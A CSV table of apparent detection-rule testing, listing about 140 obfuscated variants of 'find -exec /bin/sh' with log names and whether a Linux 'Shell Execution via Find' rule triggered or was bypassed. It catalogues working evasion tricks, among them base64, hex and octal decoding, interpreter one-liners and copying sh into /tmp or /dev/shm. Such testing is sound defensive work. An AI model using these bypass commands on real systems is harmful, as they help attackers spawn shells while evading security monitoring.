ID,Command,Log File,Result,All Detected Rules
140,find -exec /bin/sh \; -quit -mtime 0,Shell_Execution_via_Find_attack140.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
141,find -exec /bin/sh \; -quit -cmin -1,Shell_Execution_via_Find_attack141.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
142,find -exec /bin/sh \; -quit -amin -1,Shell_Execution_via_Find_attack142.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
143,find -exec /bin/sh \; -quit -anewer /etc/passwd,Shell_Execution_via_Find_attack143.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
144,find -exec /bin/sh \; -quit -samefile /etc/passwd,Shell_Execution_via_Find_attack144.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
145,find -exec /bin/sh \; -quit -nouser,Shell_Execution_via_Find_attack145.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
146,find -exec /bin/sh \; -quit -nogroup,Shell_Execution_via_Find_attack146.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
147,"find -exec /bin/sh \; -quit -newerct ""$(date)""",Shell_Execution_via_Find_attack147.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
148,find -exec /bin/sh \; -quit -fstype ext4,Shell_Execution_via_Find_attack148.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
149,find -exec /bin/sh \; -quit -depth,Shell_Execution_via_Find_attack149.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
150,find -exec /bin/sh \; -quit -ls,Shell_Execution_via_Find_attack150.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
151,find -exec /bin/sh \; -quit -mindepth 0,Shell_Execution_via_Find_attack151.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
152,find -exec /bin/sh \; -quit -maxdepth 99,Shell_Execution_via_Find_attack152.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
153,"find -exec /bin/sh \; -quit -iname ""*""",Shell_Execution_via_Find_attack153.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
154,"find -exec /bin/sh \; -quit -path ""/tmp""",Shell_Execution_via_Find_attack154.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
155,find -exec /bin/sh \; -quit -not -empty,Shell_Execution_via_Find_attack155.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
156,find -exec /bin/sh \; -quit -type d,Shell_Execution_via_Find_attack156.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
157,find -exec /bin/sh \; -quit -type l,Shell_Execution_via_Find_attack157.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
158,find -exec /bin/sh \; -quit -perm -777,Shell_Execution_via_Find_attack158.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
159,find -exec /bin/sh \; -quit -user root,Shell_Execution_via_Find_attack159.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
160,find -exec /bin/sh \; -quit -group root,Shell_Execution_via_Find_attack160.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
161,find -exec /bin/sh \; -quit -ctime -1,Shell_Execution_via_Find_attack161.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
162,find -exec /bin/sh \; -quit -atime -1,Shell_Execution_via_Find_attack162.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
163,find -exec /bin/sh \; -quit -empty -type f,Shell_Execution_via_Find_attack163.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
164,find -exec /bin/sh \; -quit -size 0c,Shell_Execution_via_Find_attack164.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
165,find -exec /bin/sh \; -quit -print,Shell_Execution_via_Find_attack165.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
166,find -exec /bin/sh \; -quit -name test.sh,Shell_Execution_via_Find_attack166.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
167,find -exec /bin/sh \; -quit -newer /etc/shadow,Shell_Execution_via_Find_attack167.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
168,find -exec /bin/sh \; -quit -ctime +0,Shell_Execution_via_Find_attack168.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
169,"find -exec /bin/sh \; -quit -regex "".*""",Shell_Execution_via_Find_attack169.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
170,find -exec /bin/sh \; -quit -ls -type f,Shell_Execution_via_Find_attack170.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
171,find -exec /bin/sh \; -quit -ok echo {} \;,Shell_Execution_via_Find_attack171.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
172,find -exec /bin/sh \; -quit -ok /bin/true \;,Shell_Execution_via_Find_attack172.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
173,find -exec /bin/sh \; -quit -delete,Shell_Execution_via_Find_attack173.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
174,find -exec /bin/sh \; -quit -prune,Shell_Execution_via_Find_attack174.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
175,find -exec /bin/sh \; -quit -fprint /dev/null,Shell_Execution_via_Find_attack175.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
176,find -exec /bin/sh \; -quit -exec echo {} \;,Shell_Execution_via_Find_attack176.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
177,"find -exec /bin/sh \; -quit -name ""*sh"" -print",Shell_Execution_via_Find_attack177.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
178,find -exec /bin/sh \; -quit -fls /dev/null,Shell_Execution_via_Find_attack178.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
179,find -exec /bin/sh \; -quit -samefile /bin/sh,Shell_Execution_via_Find_attack179.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
180,find -exec /bin/sh \; -quit -newerXY ac /bin/sh,Shell_Execution_via_Find_attack180.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
181,find . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack181.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
182,`find . -exec /tmp/k \; -quit` *(after copying sh to /tmp/k)*,Shell_Execution_via_Find_attack182.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
183,find . -exec /bin//sh \; -quit,Shell_Execution_via_Find_attack183.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
184,find . -exec /bin/./sh \; -quit,Shell_Execution_via_Find_attack184.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
185,find . -quit -exec /bin/sh \;,Shell_Execution_via_Find_attack185.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
186,find . -exec /bin/sh -quit \;,Shell_Execution_via_Find_attack186.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
187,find . -exec\t/bin/sh\t\;\t-quit,Shell_Execution_via_Find_attack187.log,Log Error (Result Not Found),
188,find\t.\t-exec\t/bin/sh\t\;\t-quit,Shell_Execution_via_Find_attack188.log,Log Error (Result Not Found),
189,find . -quit -exec /bin/sh \;,Shell_Execution_via_Find_attack189.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
190,`find . -exec /tmp/.hidden_sh \; -quit` *(after renaming sh)*,Shell_Execution_via_Find_attack190.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
191,find . -exec $(which sh) \; -quit,Shell_Execution_via_Find_attack191.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
192,find . -exec /usr/bin/env sh \; -quit,Shell_Execution_via_Find_attack192.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
193,find . -exec /usr/bin/sh \; -quit,Shell_Execution_via_Find_attack193.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
194,find -exec /bin/sh \; . -quit,Shell_Execution_via_Find_attack194.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
195,find -exec /bin/sh \; -quit .,Shell_Execution_via_Find_attack195.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
196,find . -exec /bin/s\h \; -quit,Shell_Execution_via_Find_attack196.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
197,find . -exec /b'in'/sh \; -quit,Shell_Execution_via_Find_attack197.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
198,"find . -exec ""/bin/sh"" \; -quit",Shell_Execution_via_Find_attack198.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
199,find . -exec '/bin/sh' \; -quit,Shell_Execution_via_Find_attack199.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
200,`find . -exec /bin/sh \; -quit` *(mix of spaces and tabs)*,Shell_Execution_via_Find_attack200.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
201,find . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack201.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
202,`find . -exec $0 \; -quit` *(if script is sh)*,Shell_Execution_via_Find_attack202.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
203,`find . -exec ./sh \; -quit` *(if copied binary to current dir)*,Shell_Execution_via_Find_attack203.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
204,find . -exec /tmp/k -quit \;,Shell_Execution_via_Find_attack204.log,Log Error (Result Not Found),
205,find . -exec /b\\in/sh \; -quit,Shell_Execution_via_Find_attack205.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
206,`find . -exec /bin/sh\ \; -quit` *(extra space escape)*,Shell_Execution_via_Find_attack206.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
207,`find . -exec /bin/sh \; -q\u0069t` *(unicode `quit`)*,Shell_Execution_via_Find_attack207.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
208,`find . -exec /bin/sh \; -qui\014t` *(form feed in `quit`)*,Shell_Execution_via_Find_attack208.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
209,find . -exec /bin/sh \; -q\u0069t,Shell_Execution_via_Find_attack209.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
210,`find . -exec /bin/sh \; -qu\tit` *(tab inside `quit`)*,Shell_Execution_via_Find_attack210.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
211,`find . -exec /tmp/shell \; -quit` *(after: `cp /bin/sh /tmp/shell`)*,Shell_Execution_via_Find_attack211.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
212,`find . -exec /dev/shm/s \; -quit` *(after: `cp /bin/sh /dev/shm/s`)*,Shell_Execution_via_Find_attack212.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
213,`find . -exec /var/tmp/x \; -quit` *(after: `cp /bin/sh /var/tmp/x`)*,Shell_Execution_via_Find_attack213.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
214,find . -exec /bin/sh\ \ \ \ \; -quit,Shell_Execution_via_Find_attack214.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
215,find . -exec /bin/sh \; \ -quit,Shell_Execution_via_Find_attack215.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
216,find . -exec\t/bin/sh\t\;\t-q\u0075it,Shell_Execution_via_Find_attack216.log,Log Error (Result Not Found),
217,find . -exec /bin/sh \; -q\ uit,Shell_Execution_via_Find_attack217.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
218,find . -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack218.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
219,find . -quit -exec /tmp/x \;,Shell_Execution_via_Find_attack219.log,Log Error (Result Not Found),
220,find . -quit -exec /bin/sh \;,Shell_Execution_via_Find_attack220.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
221,find . -exec $(echo /bin/sh) \; -quit,Shell_Execution_via_Find_attack221.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
222,find . -exec` /bin/echo /bin/sh `\; -quit,Shell_Execution_via_Find_attack222.log,Log Error (Result Not Found),
223,"find . -exec ""$SHELL"" \; -quit",Shell_Execution_via_Find_attack223.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
224,find . -exec /bin/sh -c true \; -quit,Shell_Execution_via_Find_attack224.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
225,find . -exec sh \; -quit,Shell_Execution_via_Find_attack225.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
226,"find . -exec /bin/s""h"" \; -quit",Shell_Execution_via_Find_attack226.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
227,"find . -exec /bi""""n/sh \; -quit",Shell_Execution_via_Find_attack227.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
228,find . -exec /bin/'sh' \; -quit,Shell_Execution_via_Find_attack228.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
229,"find . -exec ""/bin/""sh \; -quit",Shell_Execution_via_Find_attack229.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
230,find . -exec //bin//sh \; -quit,Shell_Execution_via_Find_attack230.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
231,find . -exec /bin///sh \; -quit,Shell_Execution_via_Find_attack231.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
232,find . -exec /bin/sh$IFS\; -quit,Shell_Execution_via_Find_attack232.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
233,find . -exec /bin/sh </dev/null \; -quit,Shell_Execution_via_Find_attack233.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
234,find . -exec /bin/sh >/dev/null \; -quit,Shell_Execution_via_Find_attack234.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
235,"find . -exec /bin/sh <<<"""" \; -quit",Shell_Execution_via_Find_attack235.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
236,find / -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack236.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
237,find /tmp -exec /bin/sh \; -quit,Shell_Execution_via_Find_attack237.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
238,"find . -exec \""/bin/sh\"" \; -quit",Shell_Execution_via_Find_attack238.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
239,find . -exec \'/bin/sh\' \; -quit,Shell_Execution_via_Find_attack239.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
240,"find . -exec ""`echo /bin/sh`"" \; -quit",Shell_Execution_via_Find_attack240.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
241,find . -exec $(echo L2Jpbi9zaA== | base64 -d) \; -quit,Shell_Execution_via_Find_attack241.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text | File and Directory Discovery - Linux
242,find . -exec $(printf '\x2f\x62\x69\x6e\x2f\x73\x68') \; -quit,Shell_Execution_via_Find_attack242.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
243,find . -exec $(printf '\057\142\151\156\057\163\150') \; -quit,Shell_Execution_via_Find_attack243.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
244,find . -exec $(echo 2f62696e2f7368 | xxd -r -p) \; -quit,Shell_Execution_via_Find_attack244.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
245,"find . -exec $(perl -e 'print pack(""H*"",""2f62696e2f7368"")') \; -quit",Shell_Execution_via_Find_attack245.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
246,"find . -exec $(python3 - <<<'import sys;sys.stdout.write(bytes.fromhex(""2f62696e2f7368"").decode())') \; -quit",Shell_Execution_via_Find_attack246.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
247,find . -exec $(echo L2Jpbi9zaA | base64 -d) \; -quit,Shell_Execution_via_Find_attack247.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text | File and Directory Discovery - Linux
248,find . -exec $(printf '%b' '\x2f\x62\x69\x6e\x2f\x73\x68') \; -quit,Shell_Execution_via_Find_attack248.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
249,"find . -exec $(awk 'BEGIN{printf ""%c%c%c%c%c%c%c"",47,98,105,110,47,115,104}') \; -quit",Shell_Execution_via_Find_attack249.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
250,find . -exec $(echo 057142151156057163150 | sed 's/../\\&/g' | xargs printf) \; -quit,Shell_Execution_via_Find_attack250.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
251,"find . -exec $(perl -e 'print chr($_) for 47,98,105,110,47,115,104') \; -quit",Shell_Execution_via_Find_attack251.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
252,"find . -exec $(python3 - <<<'print("""".join(map(chr,[47,98,105,110,47,115,104])))') \; -quit",Shell_Execution_via_Find_attack252.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
253,find . -exec $(echo 2f62696e2f7368 | perl -pe 's/(..)/chr(hex($1))/ge') \; -quit,Shell_Execution_via_Find_attack253.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
254,"find . -exec $(ruby -e 'print [47,98,105,110,47,115,104].pack(""C*"")') \; -quit",Shell_Execution_via_Find_attack254.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
255,find . -exec $(echo L2Jpbi9zaA== | openssl base64 -d) \; -quit,Shell_Execution_via_Find_attack255.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
256,find . -exec $(printf '\x2F\x62\x69\x6E\x2F\x73\x68') \; -quit,Shell_Execution_via_Find_attack256.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
257,find . -exec $(echo 2f62696e2f7368 | sed 's/\(..\)/\\x\1/g' | xargs printf) \; -quit,Shell_Execution_via_Find_attack257.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
258,"find . -exec $(node -e 'process.stdout.write(Buffer.from(""2f62696e2f7368"",""hex""))') \; -quit",Shell_Execution_via_Find_attack258.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
259,"find . -exec $(lua -e 'io.write(string.char(47,98,105,110,47,115,104))') \; -quit",Shell_Execution_via_Find_attack259.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
260,"find . -exec $(php -r 'echo pack(""H*"",""2f62696e2f7368"");') \; -quit",Shell_Execution_via_Find_attack260.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
261,"find . -exec $(echo 47,98,105,110,47,115,104 | tr ',' '\n' | awk '{printf ""%c"",$1}') \; -quit",Shell_Execution_via_Find_attack261.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
262,"find . -exec $(python3 - <<<'import binascii;print(binascii.unhexlify(""2f62696e2f7368"").decode())') \; -quit",Shell_Execution_via_Find_attack262.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
263,find . -exec $(echo L2Jpbi9zaA== | busybox base64 -d) \; -quit,Shell_Execution_via_Find_attack263.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
264,find . -exec $(printf '%c%c%c%c%c%c%c' 47 98 105 110 47 115 104) \; -quit,Shell_Execution_via_Find_attack264.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
265,"find . -exec $(perl -MMIME::Base64 -e 'print decode_base64(""L2Jpbi9zaA=="")') \; -quit",Shell_Execution_via_Find_attack265.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
266,find . -exec $(echo 2f62696e2f7368 | fold -w2 | sed 's/^/\\x/' | xargs printf) \; -quit,Shell_Execution_via_Find_attack266.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
267,"find . -exec $(python3 - <<<'print(bytes([47,98,105,110,47,115,104]).decode())') \; -quit",Shell_Execution_via_Find_attack267.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
268,"find . -exec $(ruby -e 'puts ""\x2f\x62\x69\x6e\x2f\x73\x68""') \; -quit",Shell_Execution_via_Find_attack268.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
269,find . -exec $(echo L2Jpbi9zaA== | perl -MMIME::Base64 -ne 'print decode_base64($_)') \; -quit,Shell_Execution_via_Find_attack269.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
270,"find . -exec $(awk 'BEGIN{s=""2f62696e2f7368"";for(i=1;i<=length(s);i+=2)printf ""%c"",strtonum(""0x""substr(s,i,2))}') \; -quit",Shell_Execution_via_Find_attack270.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
271,find . -exec $(echo 2f 62 69 6e 2f 73 68 | xxd -r -p) \; -quit,Shell_Execution_via_Find_attack271.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
272,find . -exec $(echo -n '/bin/sh' | od -An -tx1 | tr -d ' \n' | xxd -r -p) \; -quit,Shell_Execution_via_Find_attack272.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
273,"find . -exec $(perl -e 'print ""\x2f\x62\x69\x6e\x2f\x73\x68""') \; -quit",Shell_Execution_via_Find_attack273.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
274,find . -exec $(bash -c 'echo L2Jpbi9zaA== | base64 -d') \; -quit,Shell_Execution_via_Find_attack274.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text | File and Directory Discovery - Linux
275,find . -exec $(dd if=<(echo L2Jpbi9zaA==) bs=1 skip=0 2>/dev/null | base64 -d) \; -quit,Shell_Execution_via_Find_attack275.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
276,"find . -exec $(cat <<< ""L2Jpbi9zaA=="" | base64 -d) \; -quit",Shell_Execution_via_Find_attack276.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
277,"find . -exec $(python3 -c 'print(bytes.fromhex(""2f62696e2f7368"").decode())') \; -quit",Shell_Execution_via_Find_attack277.log,Trigger: Shell Execution via Find - Linux,Shell Execution via Find - Linux | Syslog Clearing or Removal Via System Utilities | File and Directory Discovery - Linux
